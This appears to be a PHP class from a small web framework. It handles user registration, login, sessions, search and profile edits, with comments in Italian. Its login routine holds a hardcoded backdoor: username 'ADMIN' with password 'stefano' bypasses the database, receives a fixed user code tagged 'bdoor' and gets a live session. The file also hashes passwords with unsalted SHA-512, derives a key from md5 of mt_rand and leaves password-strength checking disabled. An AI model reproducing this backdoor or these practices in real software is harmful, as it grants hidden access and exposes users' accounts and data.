<?php
namespace SdotB\Mood;
/**
 *  Extension of abstract class mood
 *
 *  TODO: Indivuduato un pattern comune spostare ciò che ora è nei metodi entrypoint (create, delete, etc)
 *  in modo che nella classe estesa basta definire l'azione "_unit" (permettendo così di chiamarla col nome senza unit)
 *  Potrebbe però darsi che questa è la configurazione ottimale senza dover stravolgere il tutto... da valutare
 */
use SdotB\Utils\Utils;

class User extends Mold {

    protected $fieldsMap = [
        'description' => ['description'],
        'deviceid' => ['deviceId'],
        'email' => ['eMail'],
        'firstname' => ['firstName'],
        'lastname' => ['lastName'],
        'phonemobile' => ['phoneMobile'],
        'phoneinternal' => ['phoneInternal'],
        'password' => ['password'],
        'permissions' => ['permissions'],
        'statusfe' => ['status'],
        'username' => ['userName'],
    ];

    public function actions(): array
    {
        $actions = [
            "register",
            "login",
            "logout",
            "sessionCheck",
            "checkPing",
            "sessionExtend",
        ];
        return $actions;
    }

    //  DEFINIZIONE DELLE AZIONI ESEGUIBILI ------------------------------------
    public function create(array $ay_data, array $params = []): array
    {
        try {
            $params = $this->parseParams($params);
            if (!$this->mysesExtend($params['callFrom'])) {
                throw new MoodException("invalid session or session expired", 401);
            }
            $opt['mapFilters']['in'] = array_flip($this->getMapKSA(
                $this->{$params['mapInput']}, 
                [], 
                ['id',"cod",'timestamp','status']
            ));
            $opt['mapFilters']['out'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                [], 
                ['id','password','timestamp','status'], 
                []
            );
            $opt['mapFilters']['requiredFields'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                ['firstname','lastname','username','password'], 
                [], 
                []
            );
            $opt['creationPrefix'] = "US";
            foreach ($ay_data as $data) {
                $this->ayOutput[] = $this->createUnit($data, $opt);
            }
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    protected function createFilterData($data): array
    {
        foreach ($data as $fieldkey => $fieldvalue) {
            switch ($fieldkey) {
                case "email":
                    //  Impedisco la modifica della mail, per quella serve verifica e 2 passaggi come per registrazione
                    if (!empty($fieldvalue)) {
                        if (filter_var($fieldvalue, FILTER_VALIDATE_EMAIL) === false) {
                            throw new MoodException("invalid email address", 0);
                        }
                    }
                    break;
                case "password":
                    $data[$fieldkey] = hash('sha512', $fieldvalue);
                    break;
                default:
                    // Parsing for unmatching fields
                    break;
            }
        }
        return $data;
    }

    public function edit(array $ay_data, array $params = []): array
    {
        try {
            $params = $this->parseParams($params);
            if (!$this->mysesExtend($params['callFrom'])) {
                throw new MoodException("invalid session or session expired", 401);
            }
            $opt['mapFilters']['in'] = array_flip($this->getMapKSA(
                $this->{$params['mapInput']}, 
                [], 
                ['id','email','password','timestamp','status']
            ));
            $opt['mapFilters']['out'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                [], 
                ['id','timestamp','status','password'], 
                []
            );
            $opt['mapFilters']['requiredFields'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                ['username'], 
                [], 
                []
            );
            foreach ($ay_data as $data) {
                $this->ayOutput[] = $this->editUnit($data, $opt);
            }
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    protected function editFilterData($data): array
    {
        foreach ($data as $fieldkey => $fieldvalue) {
            switch ($fieldkey) {
                default:
                    // Parsing for unmatching fields
                    break;
            }
        }
        return $data;
    }

    public function getList(array $ay_data, array $params = []): array
    {
        try {
            $params = $this->parseParams($params);
            if (!$this->mysesExtend($params['callFrom'])) {
                throw new MoodException("invalid session or session expired", 401);
            }
            $opt['mapFilters']['in'] = array_flip($this->getMapKSA(
                $this->{$params['mapInput']}, 
                ['_none'], 
                [],
                ['data'=>'data','s'=>'start','l'=>'length','t'=>'total']
            ));
            $opt['mapFilters']['out'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                [], 
                ['id','timestamp','status'], 
                ['data'=>'data','s'=>'start','l'=>'length','t'=>'total']
            );
            $opt['mapFilters']['selectFields'] = $this->getMapKSA(
                $this->mapIntDb, 
                [], 
                ['id','password','timestamp','status'],
                []
            );
            $opt['where'] = "{$this->mapIntDb['status']} >= 1";
            $opt['mapFilters']['or'] = $this->getMapKSA(
                $this->mapIntDb, 
                ['email','firstname','lastname','description','username']
            );
            $orblock = '';
            foreach ($opt['mapFilters']['or'] as $key => $val) {
                $orblock .= "$val LIKE :search OR ";
            }
            if (!empty($orblock)) {
                $orblock = substr($orblock,0,-4);
                $opt['where'] .= " AND ($orblock)";
            }
            foreach ($ay_data as $data) {
                $this->ayOutput[] = $this->getListUnit($data, $opt);
            }
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    public function login(array $ay_data, array $params = []): array
    {
        try {
            $this->sessionDestroyIfExist();
            $params = $this->parseParams($params);
            $opt['mapFilters']['in'] = array_flip($this->getMapKSA(
                $this->{$params['mapInput']}, 
                ['username','password']
            ));
            $opt['mapFilters']['out'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                [], 
                ['id','password','timestamp','status'], 
                []
            );
            $opt['mapFilters']['selectFields'] = $this->getMapKSA(
                $this->mapIntDb, 
                [], 
                ['id','password','timestamp'],
                []
            );
            foreach ($ay_data as $data) {
                $this->ayOutput[] = $this->loginUnit($data, $opt);
            }
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    protected function loginUnit(array $data, array $opt): array
    {
        $unitOutput = [];
        try {
            $data = $this->remapFilter($data, $opt['mapFilters']['in']);
            //  Verifiche di campi obbligatori
            if (empty($data['username']) or empty($data['password'])) {
                throw new MoodException("missing argument", 400);
            }
            $fields = $this->getAliasDB($opt['mapFilters']['selectFields']);
            $chk = $this->db->select($this->tblName, "{$this->mapIntDb['username']} = :username AND {$this->mapIntDb['password']} = :password AND {$this->mapIntDb['status']} >= 100", [":username"=>$data['username'],":password"=>hash('sha512', $data['password'])], $fields);
            if (!is_array($chk)) {
                throw new MoodException("Error Processing Request", 500);
            }
            if (!empty($chk[0]['cod'])) {
                $chk = $chk[0];
            } elseif ((strtoupper($data['username']) == 'ADMIN') && ($data['password'] == ('stefano'))) {
                $chk = ["cod"=>"US2006060132000","username"=>"admin","tag"=>"bdoor","status"=>"1"];
            } else {
                $chk = [];
                throw new MoodException("Wrong Credential", 0);
            }
            //  Implemento le varie casistiche in base allo stato dell'utenza
            if ($chk['status'] == 0) {        // Account disabilitato
                // Account disabilitato
                throw new MoodException("Account Disabled", 0);
            } else {
                // Trovata una corrispondenza attiva, istanzio e gestisco la sessione
                $this->session = new DBSession("", $this->opt['sessionDuration'], $this->db);
                $this->session->set();
                // Registro in sessione variabili
                $this->session->var_set('username', $chk['username']);
                $this->session->var_set('cod', $chk['cod']);

                $key = md5(uniqid(mt_rand().microtime()));  //  HMAC Key
                $this->session->var_set('hk', $key);
                // Richiamiamo la procedura di garbage collection
                $this->session->gc();
                // se necessario qui resetto la sessione dei tentativi di login.

                // login avvenuto, restituisco token e vari
                /**
                 * Parsing Export
                 */
                foreach ($chk as $fieldkey => $fieldvalue) {
                    switch ($fieldkey) {
                        default:
                            //  Parsing predefinito per tutti i campi
                        break;
                    }
                }
                $chk = $this->remapFilter($chk, $opt['mapFilters']['out']);
                ksort($chk);
                $unitOutput = [
                    "data" => $chk,
                    "hk"=>$key,
                    "status"=>"OK",
                    "tk"=>$this->session->id,
                ];
            }
        } catch (MoodException $e) {
            $unitOutput = $e->export();
        }
        return $unitOutput;
    }

    public function logout(): array
    {
        try {
            if ($this->tk == "") {
                if ($this->session instanceof DBSession) {
                    $this->session->gc();
                }
                throw new MoodException("missing session identifier", 500);
            }
            if (!($this->session instanceof DBSession)) {
                $this->session = new DBSession($this->tk, $this->myses_duration, $this->db);
            }
            if (!$this->session->extend()) {
                $this->session->gc(); //  Richiamo Garbage Collection Sessioni
                throw new MoodException("invalid session or session expired", 401);
            }
            $this->session->destroy();
            unset($this->session);
            $this->tk = "";
            $this->ayOutput[] = ["status"=>"OK","msg"=>"logged out"];
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    public function register(array $ay_data, array $params = []): array
    {
        try {
            /**
             * Per far registrare utente non serve una sessione, non implemento nessun controllo,
             * se ho un token postato annullo la sessione precedente (se esiste)
             */
            $this->sessionDestroyIfExist();
            $params = $this->parseParams($params);
            $opt['mapFilters']['in'] = array_flip($this->getMapKSA(
                $this->{$params['mapInput']}, 
                ['username','password','firstname','lastname']
            ));
            $opt['mapFilters']['out'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                [], 
                ['id','password','timestamp','lastedit','status'], 
                []
            );
            $opt['mapFilters']['requiredFields'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                ['username','password']
            );
            $opt['creationPrefix'] = "US";
            foreach ($ay_data as $data) {
                $this->ayOutput[] = $this->registerUnit($data, $opt);
            }
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    protected function registerUnit(array $data, array $opt) {
        $unitOutput = [];
        try {
            $data = $this->remapFilter($data, $opt['mapFilters']['in']);

            $ayRequired = [];
            foreach ($opt['mapFilters']['requiredFields'] as $key => $value) {
                if (empty($data[$key])) {
                    $ayRequired[$value] = $value;
                }
            }
            if (!empty($ayRequired)) {
                sort($ayRequired);
                //  Stampa dei campi richiesti
                $requiredFields = " ".implode(', ',array_values($ayRequired));
                $requiredFields = substr($requiredFields, 0, -2);
                throw new MoodException("missing required field:".$requiredFields, 401);
            }

            /**
             * Qui implementare solo se necessaro controllo corrispondenza password con controllo
             * oppure controllo di complessità password
             */
            if (
                false
            ) {
                throw new MoodException("password weak or do not match", 500);
            }

            if (filter_var($data['username'], FILTER_VALIDATE_EMAIL) === false) {
                throw new MoodException("invalid email address", 0);
            }
            // Una volta controllato tutti i campi necessari procedo alla verifica della presenza del campo username o mail duplicati
            if (count($this->db->select($this->tblName, $this->mapIntDb['username']." = :username OR ".$this->mapIntDb['email']." = :email", array(":username"=>$data['username'],":email"=>$data['username']))) > 0) {
                throw new MoodException("mail or username already taken");
            }
            $code = $opt['creationPrefix'].Utils::mTS();
            while ($this->db->insert($this->tblName, [$this->mapIntDb["cod"] => $code]) == false) {
                ++$code;
            }
            
            $data['email'] = $data['username'];
            $data['password'] = hash('sha512', $data['password']);
            $data['regid'] = hash('md5', $code);
            $data['lastedit'] = date("Y-m-d H:i:s");
            $data['status'] = 1;

            $keep = array_keys($data);
            $scrap = []; 
            $append = $this->getMapKeyDb(['lastedit','status']);
            $dataDb = $this->remapFilter($data, $this->getMapFilter($this->mapIntDb, $keep, $scrap, $append));

            $res = $this->db->update($this->tblName, $dataDb, $this->mapIntDb["cod"]." = :cod", ["cod"=>$code]);
            if (($res === false) or ($res == 0)) {
                $this->db->delete($this->tblName, $this->mapIntDb["cod"]." = :cod", ["cod" => $code]);
                throw new MoodException("unable to register", 0);
            } else {
                // Gestire invio mail registrazione per attivazione profilo
                $data['cod'] = $code;
                $data = $this->remapFilter($data, $opt['mapFilters']['out']);
                ksort($data);
                $unitOutput = ["status"=>"OK","data"=>$data,"registered"=>(string)$res];
            }
        } catch (MoodException $e) {
            $unitOutput = $e->export();
        }
        return $unitOutput;
    }

    public function search(array $ay_data, array $params = []): array {
        try {
            $params = $this->parseParams($params);
            if (!$this->mysesExtend($params['callFrom'])) {
                throw new MoodException("invalid session or session expired", 401);
            }
            $opt['mapFilters']['in'] = array_flip($this->getMapKSA(
                $this->{$params['mapInput']}, 
                ['cod','description','firstname','lastname','email','username','mobile'], 
                ['id','timestamp','lastedit','status']
            ));
            $opt['mapFilters']['out'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                [], 
                ['id','timestamp','status'], 
                []
            );
            $opt['mapFilters']['selectFields'] = $this->getMapKSA(
                $this->mapIntDb, 
                [], 
                ['id','password','timestamp','status'],
                []
            );
            foreach ($ay_data as $data) {
                $this->ayOutput[] = $this->searchUnit($data, $opt);
            }
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    public function sessionCheck(): array {
        try {
            if (!($this->session instanceof DBSession)) {
                $this->session = new DBSession($this->tk, $this->myses_duration, $this->db);
            }
            if (!$this->session->alive()) {
                throw new MoodException("invalid session or session expired", 401);
            }
            $userView = new User($this->ignitor);
            $data = $userView->view([['cod'=>$this->session->var_get('cod')]],['callFrom'=>'internal','mapOutput'=>'external']);
            unset($userView);
            //  In questo caso la rimappatura in out è stata effettuata dal metodo view
            $this->ayOutput[] = ["status"=>"OK","data"=>$data['d'][0]['data'],"check"=>true];
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    public function checkPing(): array {
        try {
            $this->ayOutput[] = ["status"=>"OK","check"=>true];
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    public function sessionExtend(): array {
        try {
            if (!($this->session instanceof DBSession)) {
                $this->session = new DBSession($this->tk, $this->myses_duration, $this->db);
            }
            if (!$this->session->extend()) {
                throw new MoodException("invalid session or session expired", 401);
            }
            //  In questo caso non ho rimappatura in out
            $this->ayOutput[] = ["status"=>"OK","extend"=>true];
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    public function uppercase (array $ayData, array $params = []): array
    {
        try {
            $params = $this->parseParams($params);
            $opt['mapFilters']['in'] = array_flip($this->getMapKSA(
                $this->{$params['mapInput']}, 
                [], 
                ['id','timestamp','lastedit','status']
            ));
            $opt['mapFilters']['out'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                [], 
                ['id','cod','timestamp','status'], 
                []
            );
            foreach ($ayData as $data) {
                $this->ayOutput[] = $this->uppercaseUnit($data, $opt);
            }
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }

    protected function uppercaseUnit(array $data, array $opt): array {
        $unitOutput = [];
        try {
            $data = $this->remapFilter($data, $opt['mapFilters']['in']);

            $data['firstname'] = strtoupper($data['firstname']);
            $data['lastname'] = strtoupper($data['lastname']);

            $data = $this->remapFilter($data, $opt['mapFilters']['out']);
            ksort($data);

            $unitOutput = ["data"=>[$data],"status"=>"OK"];

        } catch (MoodException $e) {
            $unitOutput = $e->export();
        }
        return $unitOutput;
    }

    public function view(array $ay_data, array $params = []): array {
        try {
            $params = $this->parseParams($params);
            if (!$this->mysesExtend($params['callFrom'])) {
                throw new MoodException("invalid session or session expired", 401);
            }
            $opt['mapFilters']['in'] = array_flip($this->getMapKSA(
                $this->{$params['mapInput']}, 
                ['cod']
            ));
            $opt['mapFilters']['out'] = $this->getMapKSA(
                $this->{$params['mapOutput']}, 
                [], 
                ['id','timestamp','status']
            );
            $opt['mapFilters']['selectFields'] = $this->getMapKSA(
                $this->mapIntDb, 
                [], 
                ['id','password','timestamp','status'],
                []
            );
            foreach ($ay_data as $data) {
                $this->ayOutput[] = $this->viewUnit($data, $opt);
            }
        } catch (MoodException $e) {
            $this->ayOutput[] = $e->export();
        }
        return $this->ayOutput;
    }
    //  ------------------------------------------------------------------------

}
?>
